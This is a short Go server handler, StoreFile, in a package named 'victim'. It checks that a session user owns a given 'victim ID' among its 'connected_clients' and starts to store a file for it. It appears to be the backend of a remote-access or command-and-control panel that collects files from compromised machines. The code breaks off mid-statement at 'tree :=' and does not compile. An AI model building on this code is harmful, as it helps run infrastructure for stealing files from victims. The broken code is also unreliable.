package victim

import (
	"errors"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"go.mongodb.org/mongo-driver/bson"
	"server.com/src/database/mongo"
	types "server.com/src/shared/types/file"
	"server.com/src/utils"
)

func StoreFile(c *gin.Context, file types.RPCFile) (gin.H, error) {
	manager := sessions.Default(c)

	userID := manager.Get(utils.SESSION_KEY)
	if userID == "" {
		return nil, errors.New(utils.INVALID_CONNECTION_KEY_MESSAGE)
	}

	if !mongo.DocumentExists(bson.M{"_id": userID}) {
		return nil, errors.New("user does not exist")
	}

	victimFilter := bson.M{
		"connected_clients._id": file.VictimID,
		"_id":                   userID,
	}

	if !mongo.DocumentExists(victimFilter) {
		return nil, errors.New("invalid victim id provided")
	}

	TreeID := uuid.New()

	tree :=
}
